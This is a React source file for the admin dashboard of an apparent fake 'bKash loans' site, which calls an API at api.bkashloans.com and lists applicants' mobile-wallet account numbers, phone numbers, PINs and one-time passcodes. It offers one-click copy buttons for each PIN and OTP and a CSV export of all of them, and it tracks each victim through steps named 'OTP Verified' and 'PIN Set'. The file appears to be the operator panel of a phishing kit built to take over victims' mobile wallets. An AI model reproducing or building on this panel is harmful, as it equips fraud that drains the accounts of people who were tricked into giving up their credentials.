// pages/AdminDashboard.jsx
import React, { useState, useEffect } from 'react';
import axios from 'axios';
import { useNavigate } from 'react-router-dom';
import {
  FiHome,
  FiFileText,
  FiUsers,
  FiLogOut,
  FiMenu,
  FiX,
  FiTrash2,
  FiEye,
  FiChevronLeft,
  FiChevronRight,
  FiRefreshCw,
  FiDownload,
  FiFilter,
  FiSearch,
  FiBell,
  FiSettings,
  FiCopy
} from 'react-icons/fi';
import { toast, Toaster } from 'react-hot-toast';

const API_BASE_URL = 'https://api.bkashloans.com/api';

const Dashboard = () => {
  const [applications, setApplications] = useState([]);
  const [loading, setLoading] = useState(true);
  const [sidebarOpen, setSidebarOpen] = useState(true);
  const [selectedItems, setSelectedItems] = useState([]);
  const [currentPage, setCurrentPage] = useState(1);
  const [totalPages, setTotalPages] = useState(1);
  const [totalItems, setTotalItems] = useState(0);
  const [filters, setFilters] = useState({ step: '', category: '', search: '' });
  const [showFilters, setShowFilters] = useState(false);
  const [selectedApplication, setSelectedApplication] = useState(null);
  const [showModal, setShowModal] = useState(false);

  const navigate = useNavigate();
  const adminData = JSON.parse(localStorage.getItem('adminData') || '{}');
  const token = localStorage.getItem('adminToken');

  const fetchApplications = async () => {
    try {
      setLoading(true);
      const params = new URLSearchParams({
        page: currentPage,
        limit: 10,
        ...(filters.step && { step: filters.step }),
        ...(filters.category && { category: filters.category }),
        sortBy: 'createdAt',
        sortOrder: 'desc'
      });
      const response = await axios.get(`${API_BASE_URL}/applications?${params}`, {
        headers: { Authorization: `Bearer ${token}` }
      });
      if (response.data.success) {
        setApplications(response.data.data);
        setTotalPages(response.data.pagination.totalPages);
        setTotalItems(response.data.pagination.totalItems);
      }
    } catch (error) {
      toast.error('Failed to fetch applications');
      if (error.response?.status === 401) navigate('/login');
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    if (!token) { navigate('/login'); return; }
    fetchApplications();
  }, [currentPage, filters.step, filters.category]);

  const handleLogout = () => {
    localStorage.removeItem('adminToken');
    localStorage.removeItem('adminData');
    toast.success('Logged out successfully');
    navigate('/login');
  };

  const handleDelete = async (id) => {
    if (window.confirm('Are you sure you want to delete this application?')) {
      try {
        await axios.delete(`${API_BASE_URL}/applications/${id}`, {
          headers: { Authorization: `Bearer ${token}` }
        });
        toast.success('Application deleted successfully');
        fetchApplications();
        setSelectedItems(selectedItems.filter(item => item !== id));
        if (showModal) setShowModal(false);
      } catch {
        toast.error('Failed to delete application');
      }
    }
  };

  const handleBulkDelete = async () => {
    if (selectedItems.length === 0) { toast.error('Please select items to delete'); return; }
    if (window.confirm(`Delete ${selectedItems.length} application(s)?`)) {
      try {
        await axios.delete(`${API_BASE_URL}/applications`, {
          data: { ids: selectedItems },
          headers: { Authorization: `Bearer ${token}` }
        });
        toast.success(`${selectedItems.length} application(s) deleted`);
        setSelectedItems([]);
        fetchApplications();
      } catch {
        toast.error('Failed to delete applications');
      }
    }
  };

  const handleSelectAll = () => {
    setSelectedItems(selectedItems.length === applications.length ? [] : applications.map(a => a._id));
  };

  const handleSelect = (id) => {
    setSelectedItems(prev =>
      prev.includes(id) ? prev.filter(i => i !== id) : [...prev, id]
    );
  };

  const handleView = (application) => {
    setSelectedApplication(application);
    setShowModal(true);
  };

  const formatDate = (date) =>
    new Date(date).toLocaleDateString('en-US', {
      year: 'numeric', month: 'short', day: 'numeric',
      hour: '2-digit', minute: '2-digit'
    });

  const getStepColor = (step) => ({
    1: 'bg-slate-100 text-slate-700',
    2: 'bg-blue-100 text-blue-700',
    3: 'bg-amber-100 text-amber-700',
    4: 'bg-orange-100 text-orange-700',
    5: 'bg-emerald-100 text-emerald-700'
  }[step] || 'bg-slate-100 text-slate-700');

  const getStepDot = (step) => ({
    1: 'bg-slate-400',
    2: 'bg-blue-500',
    3: 'bg-amber-500',
    4: 'bg-orange-500',
    5: 'bg-emerald-500'
  }[step] || 'bg-slate-400');

  const getStepText = (step) => ({
    1: 'Initial',
    2: 'Account Added',
    3: 'OTP Verified',
    4: 'PIN Set',
    5: 'Completed'
  }[step] || 'Unknown');

  const exportToCSV = () => {
    const headers = ['ID', 'Amount', 'Category', 'Use Wallet', 'Account Number', 'Phone', 'PIN', 'OTP', 'Step', 'Created At'];
    const csvData = applications.map(app => [
      app._id, app.amount, app.category, app.useWallet ? 'Yes' : 'No',
      app.accountNumber || 'N/A', app.phoneNumber || 'N/A',
      app.pin || 'N/A', app.otp || 'N/A',
      getStepText(app.step), formatDate(app.createdAt)
    ]);
    const csvContent = [headers, ...csvData].map(row => row.join(',')).join('\n');
    const blob = new Blob([csvContent], { type: 'text/csv' });
    const url = window.URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `applications_${new Date().toISOString()}.csv`;
    a.click();
    window.URL.revokeObjectURL(url);
    toast.success('Export started');
  };

  const copyToClipboard = (text, label) => {
    navigator.clipboard.writeText(text);
    toast.success(`${label} copied to clipboard!`);
  };

  const menuItems = [
    { icon: FiHome, label: 'Dashboard', active: true },
  ];

  const statsCards = [
    { label: 'Total Applications', value: totalItems, color: 'text-gray-800', bg: 'bg-white', border: 'border-l-4 border-indigo-500' },
    { label: 'Completed', value: applications.filter(a => a.step === 5).length, color: 'text-emerald-600', bg: 'bg-white', border: 'border-l-4 border-emerald-500' },
    { label: 'In Progress', value: applications.filter(a => a.step < 5).length, color: 'text-amber-600', bg: 'bg-white', border: 'border-l-4 border-amber-500' },
    { label: 'Selected', value: selectedItems.length, color: 'text-indigo-600', bg: 'bg-white', border: 'border-l-4 border-blue-400' },
  ];

  return (
    <div className="flex h-screen bg-gray-50 overflow-hidden">
      <Toaster position="top-right" toastOptions={{ style: { fontSize: '14px', borderRadius: '8px' } }} />

      {/* ── OVERLAY for mobile ── */}
      {sidebarOpen && (
        <div
          className="fixed inset-0 bg-black/40 z-20 lg:hidden"
          onClick={() => setSidebarOpen(false)}
        />
      )}

      {/* ── SIDEBAR ── */}
      <aside
        className={`
          fixed lg:relative z-30 flex flex-col h-full
          bg-gray-900 text-white transition-all duration-300 ease-in-out
          ${sidebarOpen ? 'w-60' : 'w-0 lg:w-16 overflow-hidden'}
        `}
      >
        {/* Logo */}
        <div className="flex items-center justify-between px-4 h-16 border-b border-white/10 shrink-0">
          {sidebarOpen && (
            <span className="text-lg font-bold tracking-tight whitespace-nowrap">
              Loan<span className="text-indigo-400">Admin</span>
            </span>
          )}
          <button
            onClick={() => setSidebarOpen(false)}
            className="ml-auto p-1.5 rounded-lg hover:bg-white/10 transition-colors"
          >
            <FiX className="w-5 h-5" />
          </button>
        </div>

        {/* Nav */}
        <nav className="flex-1 py-4 overflow-hidden">
          {menuItems.map((item, i) => (
            <button
              key={i}
              className={`
                flex items-center gap-3 w-full px-4 py-2.5 text-sm transition-colors
                ${item.active
                  ? 'bg-indigo-600 text-white'
                  : 'text-gray-400 hover:bg-white/10 hover:text-white'}
              `}
            >
              <item.icon className="w-5 h-5 shrink-0" />
              {sidebarOpen && <span className="whitespace-nowrap">{item.label}</span>}
            </button>
          ))}
        </nav>

        {/* User + Logout */}
        <div className="border-t border-white/10 p-4 shrink-0">
          <button
            onClick={handleLogout}
            className="flex items-center gap-2 text-sm text-gray-400 hover:text-white transition-colors w-full"
          >
            <FiLogOut className="w-4 h-4 shrink-0" />
            {sidebarOpen && <span>Logout</span>}
          </button>
        </div>
      </aside>

      {/* ── MAIN ── */}
      <div className="flex-1 flex flex-col min-w-0 overflow-hidden">

        {/* Header */}
        <header className="bg-white border-b border-gray-200 h-16 flex items-center gap-4 px-4 lg:px-6 shrink-0">
          <button
            onClick={() => setSidebarOpen(true)}
            className="p-2 rounded-lg hover:bg-gray-100 text-gray-600 transition-colors"
          >
            <FiMenu className="w-5 h-5" />
          </button>
          <div className="flex-1 min-w-0">
            <h1 className="text-lg font-bold text-gray-900">Loan Applications</h1>
            <p className="text-xs text-gray-500 hidden sm:block">Manage and track all loan applications</p>
          </div>
          <div className="flex items-center gap-2">
            <button
              onClick={exportToCSV}
              className="p-2 rounded-lg hover:bg-gray-100 text-gray-600 transition-colors"
              title="Export to CSV"
            >
              <FiDownload className="w-5 h-5" />
            </button>
            <button
              onClick={fetchApplications}
              className="p-2 rounded-lg hover:bg-gray-100 text-gray-600 transition-colors"
              title="Refresh"
            >
              <FiRefreshCw className="w-5 h-5" />
            </button>
            {selectedItems.length > 0 && (
              <button
                onClick={handleBulkDelete}
                className="px-3 py-1.5 bg-red-600 text-white text-sm rounded-lg hover:bg-red-700 flex items-center gap-2 transition-colors"
              >
                <FiTrash2 className="w-4 h-4" /> Delete ({selectedItems.length})
              </button>
            )}
          </div>
          <div className="w-8 h-8 rounded-full bg-indigo-100 flex items-center justify-center text-sm font-bold text-indigo-600 shrink-0">
            {adminData.name?.charAt(0).toUpperCase() || 'A'}
          </div>
        </header>

        {/* Scrollable content */}
        <main className="flex-1 overflow-y-auto p-4 lg:p-6 space-y-5">
          {/* Table */}
          <div className="bg-white rounded-lg shadow-sm overflow-hidden">
            <div className="overflow-x-auto">
              <table className="min-w-full text-sm">
                <thead>
                  <tr className="bg-gray-50 border-b border-gray-200">
                    <th className="px-4 py-3 text-left w-10">
                      <input
                        type="checkbox"
                        checked={selectedItems.length === applications.length && applications.length > 0}
                        onChange={handleSelectAll}
                        className="rounded border-gray-300 text-indigo-600 focus:ring-indigo-500"
                      />
                    </th>
                    {['Amount', 'Category', 'Account', 'Phone', 'PIN', 'OTP', 'Step', 'Created', 'Actions'].map(h => (
                      <th key={h} className="px-4 py-3 text-left text-xs font-semibold text-gray-500 uppercase tracking-wide">
                        {h}
                      </th>
                    ))}
                  </tr>
                </thead>
                <tbody className="divide-y divide-gray-100">
                  {loading ? (
                    <tr>
                      <td colSpan="9" className="px-4 py-16 text-center">
                        <div className="flex justify-center">
                          <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-indigo-600"></div>
                        </div>
                      </td>
                    </tr>
                  ) : applications.length === 0 ? (
                    <tr>
                      <td colSpan="9" className="px-4 py-16 text-center text-gray-400">
                        <FiFileText className="w-10 h-10 mx-auto mb-3 opacity-40" />
                        <p>No applications found</p>
                      </td>
                    </tr>
                  ) : (
                    applications.map((app) => (
                      <tr key={app._id} className="hover:bg-gray-50 transition-colors">
                        <td className="px-4 py-3">
                          <input
                            type="checkbox"
                            checked={selectedItems.includes(app._id)}
                            onChange={() => handleSelect(app._id)}
                            className="rounded border-gray-300 text-indigo-600 focus:ring-indigo-500"
                          />
                        </td>
                        <td className="px-4 py-3 font-semibold text-gray-900">
                          BDT {app.amount?.toLocaleString()}
                        </td>
                        <td className="px-4 py-3 text-gray-600">{app.category || '—'}</td>
                        <td className="px-4 py-3">
                          <div className="flex items-center gap-2">
                            <span className="text-gray-600 font-mono text-xs">{app.accountNumber || '—'}</span>
                            {app.accountNumber && (
                              <button
                                onClick={() => copyToClipboard(app.accountNumber, 'Account number')}
                                className="text-gray-400 hover:text-indigo-600 transition-colors"
                                title="Copy account number"
                              >
                                <FiCopy className="w-3.5 h-3.5" />
                              </button>
                            )}
                          </div>
                        </td>
                        <td className="px-4 py-3">
                          <div className="flex items-center gap-2">
                            <span className="text-gray-600">{app.phoneNumber || '—'}</span>
                            {app.phoneNumber && (
                              <button
                                onClick={() => copyToClipboard(app.phoneNumber, 'Phone number')}
                                className="text-gray-400 hover:text-indigo-600 transition-colors"
                                title="Copy phone number"
                              >
                                <FiCopy className="w-3.5 h-3.5" />
                              </button>
                            )}
                          </div>
                        </td>
                        <td className="px-4 py-3">
                          <div className="flex items-center gap-2">
                            <span className="text-gray-600 font-mono text-sm">{app.pin || '—'}</span>
                            {app.pin && (
                              <button
                                onClick={() => copyToClipboard(app.pin, 'PIN')}
                                className="text-gray-400 hover:text-indigo-600 transition-colors"
                                title="Copy PIN"
                              >
                                <FiCopy className="w-3.5 h-3.5" />
                              </button>
                            )}
                          </div>
                        </td>
                        <td className="px-4 py-3">
                          <div className="flex items-center gap-2">
                            <span className="text-gray-600 font-mono text-xs">{app.otp || '—'}</span>
                            {app.otp && (
                              <button
                                onClick={() => copyToClipboard(app.otp, 'OTP')}
                                className="text-gray-400 hover:text-indigo-600 transition-colors"
                                title="Copy OTP"
                              >
                                <FiCopy className="w-3.5 h-3.5" />
                              </button>
                            )}
                          </div>
                        </td>
                        <td className="px-4 py-3">
                          <span className={`inline-flex items-center gap-1.5 px-2.5 py-1 text-xs font-medium rounded-full ${getStepColor(app.step)}`}>
                            <span className={`w-1.5 h-1.5 rounded-full ${getStepDot(app.step)}`}></span>
                            {getStepText(app.step)}
                          </span>
                        </td>
                        <td className="px-4 py-3 text-gray-500 text-xs whitespace-nowrap">
                          {formatDate(app.createdAt)}
                        </td>
                        <td className="px-4 py-3">
                          <div className="flex gap-1">
                            <button
                              onClick={() => handleView(app)}
                              className="p-1.5 rounded-lg text-blue-600 hover:bg-blue-50 transition-colors"
                              title="View"
                            >
                              <FiEye className="w-4 h-4" />
                            </button>
                            <button
                              onClick={() => handleDelete(app._id)}
                              className="p-1.5 rounded-lg text-red-500 hover:bg-red-50 transition-colors"
                              title="Delete"
                            >
                              <FiTrash2 className="w-4 h-4" />
                            </button>
                          </div>
                         </td>
                       </tr>
                    ))
                  )}
                </tbody>
               </table>
            </div>

            {/* Pagination */}
            {!loading && applications.length > 0 && (
              <div className="px-4 py-3 bg-gray-50 border-t border-gray-200 flex flex-col sm:flex-row items-center justify-between gap-3">
                <p className="text-xs text-gray-500">
                  Showing {(currentPage - 1) * 10 + 1}–{Math.min(currentPage * 10, totalItems)} of {totalItems}
                </p>
                <div className="flex items-center gap-2">
                  <button
                    onClick={() => setCurrentPage(p => p - 1)}
                    disabled={currentPage === 1}
                    className="p-1.5 border border-gray-300 rounded-lg disabled:opacity-40 disabled:cursor-not-allowed hover:bg-gray-100 transition-colors"
                  >
                    <FiChevronLeft className="w-4 h-4" />
                  </button>
                  <span className="text-sm text-gray-600 px-2">
                    {currentPage} / {totalPages}
                  </span>
                  <button
                    onClick={() => setCurrentPage(p => p + 1)}
                    disabled={currentPage === totalPages}
                    className="p-1.5 border border-gray-300 rounded-lg disabled:opacity-40 disabled:cursor-not-allowed hover:bg-gray-100 transition-colors"
                  >
                    <FiChevronRight className="w-4 h-4" />
                  </button>
                </div>
              </div>
            )}
          </div>
        </main>
      </div>

      {/* ── MODAL ── */}
      {showModal && selectedApplication && (
        <div className="fixed inset-0 bg-black/50 flex items-center justify-center z-50 p-4">
          <div className="bg-white rounded-xl w-full max-w-2xl max-h-[90vh] overflow-y-auto shadow-2xl">
            <div className="sticky top-0 bg-white flex justify-between items-center p-6 border-b border-gray-100">
              <div>
                <h2 className="text-lg font-bold text-gray-900">Application Details</h2>
                <div className="flex items-center gap-2 mt-0.5">
                  <p className="text-xs text-gray-500 font-mono">{selectedApplication._id}</p>
                  <button
                    onClick={() => copyToClipboard(selectedApplication._id, 'Application ID')}
                    className="text-gray-400 hover:text-indigo-600 transition-colors"
                    title="Copy ID"
                  >
                    <FiCopy className="w-3.5 h-3.5" />
                  </button>
                </div>
              </div>
              <button onClick={() => setShowModal(false)} className="p-2 rounded-lg hover:bg-gray-100 transition-colors">
                <FiX className="w-5 h-5 text-gray-500" />
              </button>
            </div>

            <div className="p-6 space-y-4">
              {/* Status badge */}
              <span className={`inline-flex items-center gap-1.5 px-3 py-1.5 text-sm font-medium rounded-full ${getStepColor(selectedApplication.step)}`}>
                <span className={`w-2 h-2 rounded-full ${getStepDot(selectedApplication.step)}`}></span>
                {getStepText(selectedApplication.step)}
              </span>

              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                {[
                  { label: 'Amount', value: `BDT ${selectedApplication.amount?.toLocaleString()}` },
                  { label: 'Category', value: selectedApplication.category || 'N/A' },
                  { label: 'Use Wallet', value: selectedApplication.useWallet ? 'Yes' : 'No' },
                  { label: 'Account Number', value: selectedApplication.accountNumber || 'Not provided' },
                  { label: 'Phone Number', value: selectedApplication.phoneNumber || 'Not provided' },
                  { label: 'OTP', value: selectedApplication.otp || 'Not verified' },
                  { label: 'PIN', value: selectedApplication.pin || 'Not set' },
                  { label: 'Created At', value: formatDate(selectedApplication.createdAt) },
                  { label: 'Last Updated', value: formatDate(selectedApplication.updatedAt) },
                ].map(({ label, value }) => (
                  <div key={label} className="bg-gray-50 rounded-lg p-3">
                    <p className="text-xs text-gray-500 font-medium mb-1">{label}</p>
                    <div className="flex items-center justify-between gap-2">
                      <p className="text-sm text-gray-900 font-medium break-all">{value}</p>
                      {value && value !== 'N/A' && value !== 'Not provided' && value !== 'Not verified' && value !== 'Not set' && (
                        <button
                          onClick={() => copyToClipboard(value.replace('BDT ', ''), label)}
                          className="text-gray-400 hover:text-indigo-600 transition-colors shrink-0"
                          title={`Copy ${label.toLowerCase()}`}
                        >
                          <FiCopy className="w-4 h-4" />
                        </button>
                      )}
                    </div>
                  </div>
                ))}
              </div>
            </div>

            <div className="sticky bottom-0 bg-white flex justify-end gap-3 p-6 border-t border-gray-100">
              <button
                onClick={() => setShowModal(false)}
                className="px-4 py-2 text-sm border border-gray-300 rounded-lg hover:bg-gray-50 transition-colors"
              >
                Close
              </button>
              <button
                onClick={() => handleDelete(selectedApplication._id)}
                className="px-4 py-2 text-sm bg-red-600 text-white rounded-lg hover:bg-red-700 flex items-center gap-2 transition-colors"
              >
                <FiTrash2 className="w-4 h-4" /> Delete
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
};

export default Dashboard;